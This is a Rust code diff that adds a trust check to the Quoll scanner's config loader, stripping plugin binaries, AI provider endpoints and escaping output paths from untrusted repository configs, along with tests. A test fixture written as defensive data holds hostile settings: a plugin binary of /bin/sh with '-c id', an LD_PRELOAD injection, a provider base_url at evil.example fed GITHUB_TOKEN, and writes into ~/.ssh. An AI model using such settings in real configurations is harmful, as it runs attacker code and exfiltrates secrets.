@@ -11,6 +11,9 @@ pub const CONFIG_FILE: &str = "quoll.toml";
 /// Directory Quoll owns inside a repository: graph, baselines, reports, cache.
 pub const STATE_DIR: &str = ".quoll";
 
+/// Environment variable that marks a discovered `quoll.toml` as trusted, e.g. `=1`.
+pub const TRUST_ENV: &str = "QUOLL_TRUST_REPO_CONFIG";
+
 /// Root of `quoll.toml`.
 ///
 /// Every field has a defensible default so that `quoll scan` works on a repository with
@@ -99,7 +102,6 @@ fn default_excludes() -> Vec<String> {
         "**/.quoll/**",
         "**/*.min.js",
         "**/*.min.css",
-        "**/*.lock",
         "**/*.map",
     ]
     .iter()
@@ -337,18 +339,97 @@ impl Config {
         })
     }
 
+    /// Discover configuration, neutralising a found `quoll.toml` unless `trusted`.
+    ///
+    /// A discovered file belongs to the repository being scanned, which in CI may be a
+    /// fork's pull request; see [`Config::untrusted`].
+    pub fn discover_with_trust(start: &Path, trusted: bool) -> Result<Config> {
+        let config = Config::discover(start)?;
+        if trusted || config.source_path.is_none() {
+            return Ok(config);
+        }
+        let (config, ignored) = config.untrusted();
+        if !ignored.is_empty() {
+            tracing::warn!(
+                ignored = %ignored.join(", "),
+                "ignoring repository quoll.toml settings that run code or send data; \
+                 pass --trust-repo-config or set {TRUST_ENV}=1 to honour them"
+            );
+        }
+        Ok(config)
+    }
+
     pub fn load(path: &Path) -> Result<Config> {
         let text =
             std::fs::read_to_string(path).map_err(|e| Error::io(path.to_path_buf(), e))?;
         let mut config: Config =
             toml::from_str(&text).map_err(|e| Error::parse(path.display().to_string(), e))?;
         config.source_path = Some(path.to_path_buf());
-        config.root = path
+        // `Path::new("quoll.toml").parent()` is `Some("")`, which would root the scan nowhere.
+        let parent = path
             .parent()
-            .map(Path::to_path_buf)
-            .unwrap_or_else(|| PathBuf::from("."));
+            .filter(|p| !p.as_os_str().is_empty())
+            .unwrap_or_else(|| Path::new("."));
+        config.root = parent.canonicalize().unwrap_or_else(|_| parent.to_path_buf());
         config.validate()?;
         Ok(config)
+    }
+
+    /// Strip every setting that would let the scanned repository run code or exfiltrate
+    /// secrets: plugin `binary`/`extra_args`/`env`, AI provider `command`/`args`/
+    /// `base_url`/`api_key_env`, and output paths that escape the repository root.
+    ///
+    /// Returns the neutralised config and the dotted names of what was dropped. Stripping
+    /// a provider also switches AI off, since it can no longer be reached as configured.
+    pub fn untrusted(mut self) -> (Config, Vec<String>) {
+        let mut ignored = Vec::new();
+        for (id, settings) in &mut self.plugins.settings {
+            if settings.binary.take().is_some() {
+                ignored.push(format!("plugins.{id}.binary"));
+            }
+            if !settings.extra_args.is_empty() {
+                settings.extra_args.clear();
+                ignored.push(format!("plugins.{id}.extra_args"));
+            }
+            if !settings.env.is_empty() {
+                settings.env.clear();
+                ignored.push(format!("plugins.{id}.env"));
+            }
+        }
+
+        let mut provider_stripped = false;
+        for (id, provider) in &mut self.ai.providers {
+            let before = ignored.len();
+            if provider.command.take().is_some() {
+                ignored.push(format!("ai.providers.{id}.command"));
+            }
+            if !provider.args.is_empty() {
+                provider.args.clear();
+                ignored.push(format!("ai.providers.{id}.args"));
+            }
+            if provider.base_url.take().is_some() {
+                ignored.push(format!("ai.providers.{id}.base_url"));
+            }
+            if provider.api_key_env.take().is_some() {
+                ignored.push(format!("ai.providers.{id}.api_key_env"));
+            }
+            provider_stripped |= ignored.len() > before;
+        }
+        if provider_stripped && self.ai.enabled {
+            self.ai.enabled = false;
+            self.ai.provider = None;
+            ignored.push("ai.enabled".to_string());
+        }
+
+        if escapes_root(&self.report.output_dir) {
+            self.report.output_dir = ReportConfig::default().output_dir;
+            ignored.push("report.output_dir".to_string());
+        }
+        if escapes_root(&self.graph.path) {
+            self.graph.path = GraphConfig::default().path;
+            ignored.push("graph.path".to_string());
+        }
+        (self, ignored)
     }
 
     pub fn to_toml(&self) -> Result<String> {
@@ -429,6 +510,23 @@ impl Config {
     pub fn ai_enabled(&self) -> bool {
         self.ai.enabled && self.scan.profile.allows_ai()
     }
+}
+
+/// Whether [`TRUST_ENV`] grants trust to a discovered `quoll.toml`.
+pub fn trust_granted_by_env() -> bool {
+    std::env::var(TRUST_ENV)
+        .map(|v| matches!(v.trim(), "1" | "true" | "yes"))
+        .unwrap_or(false)
+}
+
+/// Whether a config-relative path could land outside the repository root.
+///
+/// Lexical on purpose: the path may not exist yet, and `..` or an absolute path is reason
+/// enough to refuse it from an untrusted file.
+fn escapes_root(path: &Path) -> bool {
+    use std::path::Component;
+    path.components()
+        .any(|c| matches!(c, Component::RootDir | Component::Prefix(_) | Component::ParentDir))
 }
 
 /// Starter `quoll.toml` written by `quoll init`.
@@ -596,6 +694,88 @@ mod tests {
         config.ai.enabled = true;
         config.scan.profile = Profile::Fast;
         assert!(!config.ai_enabled());
+    }
+
+    #[test]
+    fn default_excludes_keep_lockfiles_visible() {
+        assert!(!ScanConfig::default().exclude.iter().any(|e| e.ends_with(".lock")));
+    }
+
+    fn scratch_dir(tag: &str) -> PathBuf {
+        let dir = std::env::temp_dir().join(format!("quoll-{tag}-{}", std::process::id()));
+        std::fs::create_dir_all(dir.join(".git")).unwrap();
+        dir
+    }
+
+    #[test]
+    fn load_roots_config_in_its_canonical_directory() {
+        let dir = scratch_dir("load");
+        std::fs::write(dir.join(CONFIG_FILE), "").unwrap();
+        let config = Config::load(&dir.join(CONFIG_FILE)).unwrap();
+        assert_eq!(config.root, dir.canonicalize().unwrap());
+        std::fs::remove_dir_all(&dir).ok();
+    }
+
+    const HOSTILE: &str = r#"
+        [plugins.gitleaks]
+        binary = "/bin/sh"
+        extra_args = ["-c", "id"]
+        env = { LD_PRELOAD = "/tmp/x.so" }
+        timeout_secs = 30
+        [ai]
+        enabled = true
+        provider = "evil"
+        [ai.providers.evil]
+        kind = "openai"
+        base_url = "https://evil.example"
+        api_key_env = "GITHUB_TOKEN"
+        [report]
+        output_dir = "/home/user/.ssh"
+        [graph]
+        path = "../outside.db"
+    "#;
+
+    #[test]
+    fn untrusted_config_is_neutralised() {
+        let config: Config = toml::from_str(HOSTILE).unwrap();
+        let (config, ignored) = config.untrusted();
+        let gitleaks = config.plugins.settings_for("gitleaks").unwrap();
+        assert!(gitleaks.binary.is_none());
+        assert!(gitleaks.extra_args.is_empty());
+        assert!(gitleaks.env.is_empty());
+        assert_eq!(gitleaks.timeout_secs, Some(30), "harmless settings survive");
+        let evil = &config.ai.providers["evil"];
+        assert!(evil.base_url.is_none() && evil.api_key_env.is_none());
+        assert!(!config.ai.enabled);
+        assert_eq!(config.report.output_dir, ReportConfig::default().output_dir);
+        assert_eq!(config.graph.path, GraphConfig::default().path);
+        assert!(config.validate().is_ok());
+        for name in ["plugins.gitleaks.binary", "ai.providers.evil.base_url", "report.output_dir"] {
+            assert!(ignored.iter().any(|i| i == name), "{name} not reported");
+        }
+    }
+
+    #[test]
+    fn discovery_neutralises_unless_trusted() {
+        let dir = scratch_dir("trust");
+        std::fs::write(dir.join(CONFIG_FILE), HOSTILE).unwrap();
+
+        let trusted = Config::discover_with_trust(&dir, true).unwrap();
+        let binary = trusted.plugins.settings_for("gitleaks").unwrap().binary.clone();
+        assert_eq!(binary, Some(PathBuf::from("/bin/sh")));
+        assert!(trusted.ai.enabled);
+
+        let untrusted = Config::discover_with_trust(&dir, false).unwrap();
+        assert!(untrusted.plugins.settings_for("gitleaks").unwrap().binary.is_none());
+        assert!(untrusted.ai.providers["evil"].base_url.is_none());
+        std::fs::remove_dir_all(&dir).ok();
+    }
+
+    #[test]
+    fn relative_paths_inside_the_repo_are_not_escapes() {
+        assert!(!escapes_root(Path::new("out/reports")));
+        assert!(escapes_root(Path::new("../reports")));
+        assert!(escapes_root(Path::new("/tmp/reports")));
     }
 
     #[test]
